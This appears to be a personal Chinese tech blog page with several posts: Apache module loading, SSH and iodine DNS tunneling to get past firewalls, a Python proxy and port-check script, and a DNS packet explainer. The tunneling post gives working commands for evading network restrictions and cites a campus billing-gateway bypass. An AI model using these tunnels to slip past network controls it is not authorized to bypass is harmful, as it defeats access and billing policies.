<h2 id="和模块有关的目录结构">和模块有关的目录结构</h2><pre><code><span class="regexp">/etc/apache2/mods-enabled/</span>      <span class="comment">#Apache启动时载入的模块</span>
<span class="regexp">/etc/apache2/mods-available/</span>    <span class="comment">#Apache编译时所有选择编译的模块</span>
<span class="regexp">/usr/lib/apache2/modules/</span>       <span class="comment">#编译后的.so文件的存放目录</span>

shell&gt; a2enmod mod_name <span class="comment">#设置Apache启动时加载该模块，必须是已经安装的模块就是available中存在的模块</span>
</code></pre><h2 id="Apache启动时模块载入过程">Apache启动时模块载入过程</h2><p><img src="http://quanyong.pub/pic/apache_start.png" alt="apache_start"></p>
<p>a.首先Apache启动的时候会先解析apache2.conf文件,我们在这里定义了需要载入的模块，定义格式形如：</p>
<pre><code><span class="title">Include</span> mods-enabled/<span class="regexp">*.load</span>
Include mods-enabled/<span class="regexp">*.conf</span>
</code></pre><p>b.enabled中的文件是软连接的形式指向available中的文件。<br>c.在available文件夹中形如*.load的文件中存放的是对应的.so文件的存放地址。</p>
<pre><code>LoadModule cache_module <span class="regexp">/usr/</span>lib<span class="regexp">/apache2/m</span>odules<span class="regexp">/mod_cache.so</span>
</code></pre><p>d.Apache载入对应的模块。</p>
<h2 id="单独安装模块过程">单独安装模块过程</h2><p>1.看一下Apache版本，下载对应版本Apache源码:<a href="http://apache.org/" target="_blank" rel="external">http://apache.org/</a></p>
<p>2.安装apxs2（Apache中提供的可以单独编译Apache模块源码的应用）</p>
<pre><code>apt-<span class="built_in">get</span> install apache2-prefork-<span class="built_in">dev</span>
</code></pre><p>3.使用apxs2编译mod_cache.c</p>
<pre><code>cd到mod_cache.c所在目录
apxs2 -c mod_cache<span class="class">.c</span>
apxs2 -<span class="tag">i</span> -<span class="tag">a</span> -n mod_rewrite mod_rewrite<span class="class">.la</span> 
此时<span class="class">.so</span> <span class="class">.conf</span> .load文件都被放到了对应了目录中
</code></pre><p>4.重新载入模块</p>
<pre><code><span class="title">service</span> apache2 reload
</code></pre></span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2015/12/29/浅谈隧道技术及利用姿势/" itemprop="url">
                浅谈隧道技术及利用姿势
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2015-12-29T09:54:05+08:00" content="2015-12-29">
            2015-12-29
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/2015/12/29/浅谈隧道技术及利用姿势/#comments" itemprop="discussionUrl">
                <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/29/浅谈隧道技术及利用姿势/" itemprop="commentsCount"></span>
              </a>
            </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><h2 id="简介">简介</h2><p>写下标题后发现题目起的似乎大了些，缩小下范围，在这里主要讨论基于TCP/IP的应用层协议隧道（SSH DNS）<br>不同的网络环境下，防火墙的限制策略也不尽相同，如何通过不同的隧道绕过通信限制，或者通过跳板机利用不同隧道进行代理转发穿透防火墙，控制流量从自定义的各种通道进行传输，是一件很有意思的事情。</p>
<h2 id="SSH转发功能">SSH转发功能</h2><p>SSH除了可以当作linux的远程管理工具，它的转发功能也是十分强大的。</p>
<p>情境：在VPS上已经搭建好了TOR服务，通过ssh的转发功能将http类型的请求转发到VPS上TOR服务运行的端口上，以达到隐藏IP的目的。</p>
<pre><code>ssh -l loginname -L <span class="string">localhost:</span><span class="string">local_port:</span><span class="string">torhost:</span>torport vpshost
</code></pre><p><img src="http://quanyong.pub/pic/SSH_Forwarding.png" alt="ssh_Forwarding"></p>
<p>localhost:local_port—-&gt;ssh监听的端口，浏览器代理设置到此端口<br>torhost:torport—-&gt;tor应用运行的host和port<br>vpshost—-&gt;ssh要连接的IP</p>
<p>到这产生了一个疑惑其实就是实现了一个代理转发功能，为什么还要称为SSH隧道技术呢？</p>
<p>我认为原因是ssh在进行数据传输的时候进行了加密处理，一次http请求在客户端和VPS之间 流量通过的一系列设备看来只是进行了一次ssh通信。</p>
<p>1.当开启转发功能后，Wireshark抓到的包全部被识别为ssh和tcp协议，所以当防火墙策略不对该ssh通信做出限制，我们就可以通过这个通道浏览网页。<br>2.客户端和VPS上ssh为我们完成了加密解密的过程，发送一个http请求，监听torhost:torport发现该端口收到的就是一个明文http请求。</p>
<h2 id="DNS隧道技术">DNS隧道技术</h2><p>第一次接触DNS隧道技术源于wooyun上一个关于我邮的绕过计费网关的漏洞。<br><a href="http://wooyun.org/bugs/wooyun-2010-099967" target="_blank" rel="external">[DNS tunnel实例]北京某大学网关计费系统可被绕过</a></p>
<p>ssh隧道建立过程中ssh帮我们完成了数据的加密解密，在DNS隧道建立过程中同样需要类似功能的应用。</p>
<p>这里使用了iodine</p>
<p>1.添加两条域名解析记录</p>
<pre><code><span class="keyword">NS</span>    名称-&gt;记录值
<span class="keyword">A</span>    记录值-&gt;IP    
</code></pre><p>2.服务端(ubuntu)</p>
<pre><code>首先安装对应版本iodine
iodined -c -f <span class="number">172.0</span><span class="number">.0</span><span class="number">.1</span> -P password 记录值
<span class="preprocessor">#要确保<span class="number">172.0</span><span class="number">.0</span><span class="number">.1</span>不是正在使用的内网网段，开始设置的时候用了<span class="number">10</span>网段貌似和公司内网ip冲突，数据包全发到这个机器上。</span>
</code></pre><p>3.客户端(win7_64)</p>
<pre><code>安装iodine对应版本，与服务端版本一致
安装OpenVPN 的 TAP Virtual Ethernet Adapter模块
iodine <span class="operator">-f</span> -P password server_ip 记录值
</code></pre><p>4.使用ssh转发</p>
<pre><code>ping <span class="number">172.0</span><span class="number">.0</span><span class="number">.1</span>  <span class="preprocessor">#看看能不能通</span>
ssh -l loginname -L localhost:local_port:torhost:torport <span class="number">172.0</span><span class="number">.0</span><span class="number">.1</span>
代理设置为-&gt;localhost:local_port
</code></pre><p>5.验证<br>打开wireshark后发现多了一个网卡:本地连接2</p>
<p>对本地连接2进行嗅探发现基本都是172.0.0.1到172.0.0.2之间的ssh类型的通信<br>对本地连接进行嗅探发现基本都是本机到vps指点DNS类型的通信，如下图<br><img src="http://quanyong.pub/pic/dns_tunnel.png" alt="dns_tunnel"></p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2015/12/28/python渗透测试学习-http代理实现/" itemprop="url">
                python渗透测试学习-http代理实现
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2015-12-28T14:42:28+08:00" content="2015-12-28">
            2015-12-28
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/2015/12/28/python渗透测试学习-http代理实现/#comments" itemprop="discussionUrl">
                <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/28/python渗透测试学习-http代理实现/" itemprop="commentsCount"></span>
              </a>
            </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><h2 id="简述">简述</h2><p>http是以TCP为基础进行传输的，如果我们在服务端监听端口，处理请求数据并回应给客户端，就实现了http代理。<br>以访问quanyong.xyz为例：</p>
<p><img src="http://quanyong.pub/pic/HTTP_PROXY.png" alt="HTTP_PROXY"><br>1.VPS监听特定端口=0.0.0.0:9999，将浏览器的代理设置为=IP:9999,向quanyong.xyz发送GET请求。<br>2.VPS接受该请求，并解析请求内容，利用解析结果和quanyong.xyz建立一个socket连接，send步骤1中接受的数据，此时VPS就模拟了浏览器发送http请求<br>3.VPS接受http_response<br>4.将数据传回客户端。</p>
<p>下面给出代码：</p>
<pre><code><span class="comment">#coding=utf-8</span>
<span class="keyword">import</span> socket
<span class="keyword">import</span> sys
<span class="keyword">import</span> threading
<span class="keyword">import</span> urllib2

local_host = <span class="string">'0.0.0.0'</span>
local_port = <span class="number">9999</span>

<span class="function"><span class="keyword">def</span> <span class="title">get_target</span><span class="params">(request_content)</span>:</span>
    <span class="comment">#解析从浏览器发送过来的get请求，筛选目标host与port，返回一个元组类型</span>
    <span class="keyword">try</span>:
        request_target = request_content[:request_content.find(<span class="string">'\n'</span>)].split(<span class="string">' '</span>)[<span class="number">1</span>]
        request_target = request_target.replace(<span class="string">'http://'</span>,<span class="string">''</span>)
        request_target = request_target[:request_target.find(<span class="string">'/'</span>)]
    <span class="keyword">except</span> Exception, e:
        <span class="keyword">raise</span> e

    <span class="keyword">if</span> <span class="string">':'</span> <span class="keyword">in</span> request_target:
        remote_list = request_target.split(<span class="string">':'</span>)
        remote_host = remote_list[<span class="number">0</span>]
        remote_port = int(remote_list[<span class="number">1</span>])
        <span class="keyword">return</span> (remote_host,remote_port)
    <span class="keyword">else</span>:
        remote_host = request_target
        remote_port = <span class="number">80</span>
        <span class="keyword">return</span> (remote_host,remote_port)

<span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket,client_addr)</span>:</span>
    request_content = client_socket.recv(<span class="number">100000</span>)
    <span class="keyword">print</span> <span class="string">'Recieve %d Bytes info from %s'</span>%(len(request_content),client_addr[<span class="number">0</span>])
    <span class="keyword">if</span> request_content:
        response_content = server_handler(request_content)
        client_socket.send(response_content)

<span class="function"><span class="keyword">def</span> <span class="title">server_handler</span><span class="params">(request_content)</span>:</span>
    <span class="comment">#接受请求数据，返回一个字符串类型的http_response</span>
    remote_host,remote_port = get_target(request_content)
    <span class="keyword">try</span>:
        server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server_socket.connect((remote_host,remote_port))
        server_socket.send(request_content)
        send_back_content = server_socket.recv(<span class="number">1000000</span>)
        <span class="keyword">return</span> send_back_content
    <span class="keyword">except</span> Exception, e:
        <span class="keyword">raise</span> e


<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>
    client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client_socket.bind((local_host,local_port))
    client_socket.listen(<span class="number">5</span>)
    <span class="keyword">while</span> <span class="keyword">True</span>:
        client,addr = client_socket.accept()
        <span class="keyword">print</span> <span class="string">'Accept info from %s %d'</span> % (addr[<span class="number">0</span>],addr[<span class="number">1</span>])
        client_thread = threading.Thread(target=client_handler,args=(client,addr))
        client_thread.start()

<span class="keyword">if</span> __name__=<span class="string">'__main__'</span>:
    main()
</code></pre><p>存在问题：<br>1.http-request内容解析部分存在问题，筛选host和port。<br>2.线程方面没有做处理，会出现两个线程操作一个变量的情况。</p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2015/12/24/python渗透测试学习-SOCKET基础/" itemprop="url">
                python渗透测试学习-SOCKET基础
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2015-12-24T14:57:44+08:00" content="2015-12-24">
            2015-12-24
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/2015/12/24/python渗透测试学习-SOCKET基础/#comments" itemprop="discussionUrl">
                <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/24/python渗透测试学习-SOCKET基础/" itemprop="commentsCount"></span>
              </a>
            </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><p><a href="https://docs.python.org/2/library/socket.html" target="_blank" rel="external">socket for python document</a> </p>
<h2 id="这里用python实现一个简单的端口验证脚本">这里用python实现一个简单的端口验证脚本</h2><pre><code>&gt;&gt;&gt;<span class="keyword">import</span> socket
&gt;&gt;&gt;s = socket.socket()
&gt;&gt;&gt;s.connection((<span class="string">'192.168.*.*'</span>,<span class="number">22</span>))<span class="comment">#如果22端口开放则正常否则抛出异常</span>


<span class="keyword">import</span> socket,sys

<span class="function"><span class="keyword">def</span> <span class="title">portopen</span><span class="params">(ip,port)</span>:</span>
    <span class="keyword">try</span>:
        s=socket.socket()
        s = s.connect((ip,port))
        <span class="keyword">return</span> <span class="keyword">True</span>
    <span class="keyword">except</span> Exception, e:
        <span class="keyword">return</span> <span class="keyword">False</span>

<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>
    ip = sys.argv[<span class="number">1</span>]
    port = int(sys.argv[<span class="number">2</span>])
    <span class="keyword">if</span> portopen(ip,port):
        <span class="keyword">print</span> <span class="string">'%d on %s is open'</span> % (port,ip)
    <span class="keyword">else</span>:
        <span class="keyword">print</span> <span class="string">'%d on %s is closed'</span> % (port,ip)

<span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:
    main()
</code></pre><p>example</p>
<pre><code>port<span class="class">.py</span> quanyong<span class="class">.pub</span> <span class="number">9999</span>
</code></pre><h2 id="端口监控">端口监控</h2><p>就是一段TCP服务端的代码，把监听到的指定端口的信息打印出来</p>
<pre><code><span class="keyword">import</span> socket
<span class="keyword">import</span> threading
<span class="keyword">import</span> urllib
bind_ip = <span class="string">'0.0.0.0'</span>
bind_port = <span class="number">9999</span>
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((bind_ip,bind_port))
server.listen(<span class="number">5</span>)                    <span class="comment">#最多允许5个TCP连接</span>
<span class="keyword">print</span> <span class="string">'listen on %s:%d'</span>%(bind_ip,bind_port)
<span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(cliet_socket)</span>:</span>
    <span class="comment">#线程中run部分的内容</span>
    revc_from_client=cliet_socket.recv(<span class="number">100000</span>)
    <span class="keyword">print</span> revc_from_client
    cliet_socket.send(<span class="string">'hello~shabby'</span>)
    cliet_socket.close()
<span class="keyword">while</span> <span class="keyword">True</span>:
    client,addr = server.accept()<span class="comment">#client is new socket object useble to send and recieve message</span>
    <span class="keyword">print</span> <span class="string">'[*]address from %s:%d is connected'</span> % (addr[<span class="number">0</span>],addr[<span class="number">1</span>])
    handler = threading.Thread(target=handle_client,args=(client,))<span class="comment">#args为元组类型指定的参数传给target</span>
    handler.start()
</code></pre><h2 id="python发送http请求">python发送http请求</h2><p>python中urllib，urllib2，httplib这三个模块中都提供发送http请求的方法，配合上一节的端口监控脚本，观察一下这三个模块发送GET请求有什么区别。</p>
<pre><code>&gt;&gt;&gt;import urllib,urllib2,httplib
&gt;&gt;&gt;<span class="tag">a</span> = urllib.<span class="function"><span class="title">urlopen</span><span class="params">(url)</span></span>
    GET / HTTP/<span class="number">1.0</span>
    Host: quanyong<span class="class">.pub</span>:<span class="number">9999</span>
    User-Agent: Python-urllib/<span class="number">1.17</span>

&gt;&gt;&gt;<span class="tag">b</span> = urllib2.<span class="function"><span class="title">urlopen</span><span class="params">(url)</span></span>
    GET / HTTP/<span class="number">1.1</span>
    Accept-Encoding: identity
    Host: quanyong<span class="class">.pub</span>:<span class="number">9999</span>
    Connection: close
    User-Agent: Python-urllib/<span class="number">2.7</span>

&gt;&gt;&gt;c = httplib.<span class="function"><span class="title">HTTPConnection</span><span class="params">(host,port)</span></span>
&gt;&gt;&gt;c.<span class="function"><span class="title">request</span><span class="params">(method=<span class="string">'GET'</span>)</span></span>
    GET http:<span class="comment">//quanyong.pub:9999/ HTTP/1.1</span>
    Host: quanyong<span class="class">.pub</span>:<span class="number">9999</span>
    Accept-Encoding: identity
</code></pre><p>1.urllib模块在发起http请求的时候用了http1.0。<br>2.urllib和urllib2设置了User-Agent值，不知道会不会有应用识别这个值，限制大量请求。<br>3.httplib模块中创建httplib.HTTPConnection(host,port)对象的时候并不会创建TCP连接。</p>
<p>今天到这里，下一节实现一个可以转发http请求功能的脚本。</p>
<p>Marry Christmas~</p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">

      
      
        <h1 class="post-title" itemprop="name headline">
          
          
            
              <a class="post-title-link" href="/2015/12/15/浅谈DNS协议及使用/" itemprop="url">
                浅谈DNS协议及使用
              </a>
            
          
        </h1>
      

      <div class="post-meta">
        <span class="post-time">
          发表于
          <time itemprop="dateCreated" datetime="2015-12-15T14:34:54+08:00" content="2015-12-15">
            2015-12-15
          </time>
        </span>

        

        
          
            <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/2015/12/15/浅谈DNS协议及使用/#comments" itemprop="discussionUrl">
                <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/15/浅谈DNS协议及使用/" itemprop="commentsCount"></span>
              </a>
            </span>
          
        
      </div>
    </header>

    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody"><h2 id="什么是DNS">什么是DNS</h2><p>DNS(Domain Name System)，一个分布式提供域名解析服务的系统。<br>在我们进行网络通讯的时候更习惯记住对方的域名而不是IP，但是机器却更喜欢使用IP来找到通讯目标。人们想了一个折中的办法，把域名和IP形成映射关系（DNS记录）找个地方放起来，每当需要的时候让计算机到这个地方查一下记录，从而找到对应的IP。在早期的互联网中并没有那么多主机要进行管理，每个机器的管理员就共同维护一张DNS记录表，也就是现在的host文件，但是在今天每台计算机都要定期维护这样一张表是不现实的，于是就有了今天的DNS。DNS的架构及工作流程将在下文进行分析。</p>
<h2 id="DNS协议-查询/应答报文">DNS协议-查询/应答报文</h2><p>DNS协议属于应用层的协议，通常通过53端口提供服务，和http一样是基于TCP/UDP进行传输的，DNS大部分的时候是基于UDP进行传输，使用UDP只需要一问一答，而使用TCP的话，要通过三次握手建立连接，四次握手释放连接，增加了开销，但是也有一些情况会使用TCP进行传输（1，应答报文Flags-TC值为1说明报文因UDP长度限制被截断此时会用TCP重新连接2，<a href="http://quanyong.xyz/2015/10/12/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" target="_blank" rel="external">域传送</a>的时候会使用TCP连接）。</p>
<p><img src="http://quanyong.pub/pic/DNS_baowengeshi.png" alt="DNS报文格式"><br>如上图DNS协议中查询和应答的报文格式相同</p>
<p>Transaction ID : 可以随便写一个，查询和应答报文相同</p>
<p><img src="http://quanyong.pub/pic/DNS_Flags.jpg" alt="16位Flags"><br>QR：0-查询报文，1-应答报文<br>opcode：定义查询和应答的类型。0表示标准查询，1表示反向查询（由IP地址获得主机域名），2表示请求服务器状态。<br>AA：授权应答标志，仅由应答报文使用。1表示域名服务器是授权服务器。<br>TC：截断标志，仅当DNS报文使用UDP服务时使用。因为UDP数据报有长度限制，所以过长的DNS报文将被截断。1表示DNS报文超过512字节，并被截断。<br>RD：递归查询标志。1表示执行递归查询，即如果目标DNS服务器无法解析某个主机名，则它将向其他DNS服务器继续查询，如此递归，直到获得结果并把该结果返回给客户端。0表示执行迭代查询，即如果目标DNS服务器无法解析某个主机名，则它将自己知道的其他DNS服务器的IP地址返回给客户端，以供客户端参考。<br>RA：允许递归标志。仅由应答报文使用，1表示DNS服务器支持递归查询。<br>zero：这3位未用，必须都设置为0。<br>rcode：4位返回码，表示应答的状态。常用值有0（无错误）和3（域名不存在）。</p>
<p>接下来的4个字段则分别指出DNS报文的最后4个字段的资源记录数目。对查询报文而言，它一般包含1个查询问题，而应答资源记录数、授权资源记录数和额外资源记录数则为0。应答报文的应答资源记录数则至少为1，而授权资源记录数和额外资源记录数可为0或非0。    </p>
<h2 id="wireshark抓包分析">wireshark抓包分析</h2><p>在查询报文中我们只需要关注首部（问题区域以上）和问题区域部分，不关注其他数据</p>
<p>查询包<br><img src="http://quanyong.pub/pic/DNS_chaxun.png" alt="DNS查报文"><br>上图中选中部分是DNS查询报文，依次是</p>
<pre><code><span class="header">ID：*ec 09*            | 首部信息：*01 00*
------------------------------------------------</span>
<span class="header">Questions: *00 01*     | Answer RRS: *00 00*
------------------------------------------------</span>
<span class="header">Authority RRS: *00 00* | Additional RRS: *00 00*
------------------------------------------------</span>
问题区域：quanyong.xyz
<span class="strong">*08 7175616e796f6e672e78797a 00*</span>
<span class="header">#08代表问题长度--&gt;'quanyong'
------------------------------------------------</span>
</code></pre><p>应答包<br><img src="http://quanyong.pub/pic/DNS_chaxun.png" alt="DNS应报文"></p>
<pre><code><span class="code">------------------------------------------------
ID：*ec 09*            | 首部信息：*81 80*
------------------------------------------------</span>
<span class="header">Questions: *00 01*     | Answer RRS: *00 00*
------------------------------------------------</span>
<span class="header">Authority RRS: *00 01* | Additional RRS: *00 00*
------------------------------------------------</span>
问题区域：quanyong.xyz
<span class="strong">*08 7175616e796f6e672e78797a 00*</span>
Type：<span class="strong">*00 01*</span>
<span class="header">Class:*00 01*
------------------------------------------------</span>
回答区域
NAME: <span class="strong">*c0 0c*</span>
Type：<span class="strong">*00 01*</span>
Class:<span class="strong">*00 01*</span>
Time to live: <span class="strong">*0000 0258*</span>
Data lenght: <span class="strong">*00 04*</span>
<span class="header">Address:*67 f5 de 85*
-------------------------------------------------</span>
</code></pre><p>Name有两种表示方式：<br>1.直接用labal表示<br>2.记录的一个偏移量，解析报文的计算偏移量</p>
<p>一次A记录的查询，应答过程如上</p>
<h2 id="为什么全球只有13台根服务器">为什么全球只有13台根服务器</h2><p>写在知乎的回答直接粘回来</p>
<p>当客户端发送的DNS查询报文，指定的DNS无法完成解析，该DNS会返回一个应答报文告诉客户端：我不知道怎么解析，你去问DNS根服务器吧。在这个应答报文里只能装下13台根服务器的信息。</p>
<p>在学习DNS过程中恰好看到了这个问题，在这里尽量能讲的明白一点，也记录一下自己的学习过程。讲的不对的地方，欢迎指正~~</p>
<hr>
<p>想要弄明白题主的问题，为什么只有13台DNS根服务器？首先要弄明白两件事：<br>1.一次完整的域名解析流程。<br>用完整来形容可能不太恰当，这里完整的意思是包括客户端到根服务器所有交互。<br>2.DNS报文格式<br>既然说一个DNS应答报文只能装下13个服务器的信息，就要弄明白3件事情：DNS报文大小限制、每个服务器信息大小和其他部分信息的大小。</p>
<p>注：这里讲的13台是指逻辑上的13个IP，并非只有13个物理服务器。</p>
<p>这里先简单吹一波~对我们来说记住一个域名显然要比记住一个IP地址方便的多，但是计算机在通讯的时候则需要通过IP地址，于是人们整理出了一份域名到IP映射关系的记录，每一次请求就去这个记录中查询一次对应的IP，就像今天windows中的host文件。早期的互联网并没有那么多计算机，只需要管理员们共同维护相同的记录，就解决了域名解析的需求。随着计算机技术的发展，越来越多的记录需要维护，域名解析系统也随之不断发展完善，于是就有了今天的DNS。<br>DNS服务的实现大多是基于UDP来实现的，为什么用UDP上面 @郭无心 同学解释的很清楚，也有少部分情况使用TCP：<br>1.当基于UDP的DNS应答报文中截断位为1时，接收到该报文的一方会使用TCP进行连接，重新发送查询报文。<br>2.域传送的时候，域传送可以简单理解为，请求获得该服务器内关于某个域名<br>的所有记录，一般用于主服务器和备份服务器之间的记录同步。DNS服务器关于域传送配置不当可能出现域名信息泄露的情况–DNS域传送漏洞。</p>
<p>DNS系统管理维护着网络中所有的域名信息，把这些信息放在一个服务器上，考虑到网络，服务器开销等各种因素显然是不现实的，于是就采用了如今的分布式策略。这里只对什么时候会出现报文中放不下13台以上根服务器的情况进行分析。</p>
<p>以windows客户端A类型的查询为例。</p>
<p><img src="http://quanyong.pub/pic/13DNS.png" alt="DNS应报文"><br>上面IP为192.168.51.155向默认的DNS-202.106.0.20发送了一个迭代类型查询报文，报文中说：告诉我<a href="http://zhihutestbyfengge.com这个域名的IP。" target="_blank" rel="external">http://zhihutestbyfengge.com这个域名的IP。</a><br>这个域名并不存在，所以这个DNS中没有相关记录，于是就在应答报文中说：我也不知道你的问题，你问一下这13个根服务器吧。</p>
<p>继续来看一下应答报文中有什么内容</p>
<p><img src="http://quanyong.pub/pic/13DNS2.png" alt="DNS应报文"></p>
<pre><code>Transaction ID----------<span class="number">2</span>byte
Flags-------------------<span class="number">2</span>byte
Questinos---------------<span class="number">2</span>byte
Answer RRs--------------<span class="number">2</span>byte
Authority RRs-----------<span class="number">2</span>byte
Additional RRs----------<span class="number">2</span>byte  <span class="preprocessor">#Authority RRs：<span class="number">13</span> &amp;&amp; Additional RRS：<span class="number">14</span> 这两个值代表了Authoritative nameservers 和Additional records 区域记录的条数。</span>
Queries-----------------<span class="number">27</span>byte
Authoritative nameservers------<span class="number">224</span>byte
Additional records-------------<span class="number">248</span>byte
<span class="preprocessor">#一条Authority和一条Additional记录组成了一条完整的根服务器信息    </span>

<span class="number">6</span>*<span class="number">2</span>+<span class="number">27</span>+<span class="number">224</span>+<span class="number">248</span>=<span class="number">511</span>(byte)
</code></pre><p>上面有人说到基于udp的dns报文的最大限制为512byte，在这个应答报文中包含13台DNS服务器信息，占用了511byte，没有地方再放第14台记录了，所以究其问题的根本原因是因为协议限制。</p>
<p>这里我发现Additional区域多了两个AAAA类型的查询没有搞懂是怎么回事<br>关于DNS报文内容的具体含义以及接下来客户端和根服务以及根服务如何解析该域名的过程就不展开了。<br>注：<br>1.实际上返回的这13个服务器的信息是13个包含com和net顶级域名记录的gtld server。就是负责解析com和net域名的DNS，虽然应答报文中不是根服务器信息，但是我认为这种情况完全可以模拟印证开头的结论。<br>2.对于为什么DNS报文的最大限制为512byte，完全可以再开一题进行讨论，这里就不再深入了。</p>
<p>DNS篇就到这里</p>
<p><a href="http://blog.csdn.net/hunanchenxingyu/article/details/21488291" target="_blank" rel="external">http://blog.csdn.net/hunanchenxingyu/article/details/21488291</a><br><a href="http://www.lijiejie.com/dns-zone-transfer-python-client-query" target="_blank" rel="external">http://www.lijiejie.com/dns-zone-transfer-python-client-query</a><br><a href="http://lcx.cc/?i=2343" target="_blank" rel="external">http://lcx.cc/?i=2343</a><br><a href="http://network.51cto.com/art/201411/456097.htm" target="_blank" rel="external">http://network.51cto.com/art/201411/456097.htm</a></p>
</span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">&raquo;</a>
  </nav>

 </div>

        

        
      </div>

      
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      <section class="site-overview">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="http://i3.tietuku.com/11f86a6e7f812e32.jpg" alt="FengGe" itemprop="image"/>
          <p class="site-author-name" itemprop="name">FengGe</p>
        </div>
        <p class="site-description motion-element" itemprop="description"></p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">49</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">3</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">40</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/fengge98" target="_blank">github</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/u/2401245495/" target="_blank">weibo</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://douban.com/" target="_blank">douban</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.zhihu.com/" target="_blank">zhihu</a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
              <a href="http://cjker.com/" target="_blank">稀客</a>
              </span>
            
              <span class="links-of-author-item">
              <a href="http://ustb-pomelo.github.io/" target="_blank">MrL</a>
              </span>
            
          
        </div>

      </section>

      

    </div>
  </aside>


    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner"> <div class="copyright" >
  
  &copy; &nbsp; 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="icon-next-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">FengGe</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>


 </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  
  
    

  
    
  

  <script type="text/javascript">
    var duoshuoQuery = {short_name:"fengge98"};
    (function() {
      var ds = document.createElement('script');
      ds.type = 'text/javascript';ds.async = true;
      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
      ds.charset = 'UTF-8';
      (document.getElementsByTagName('head')[0]
      || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
  </script>
    
     
  	<script src="/js/ua-parser.min.js"></script>
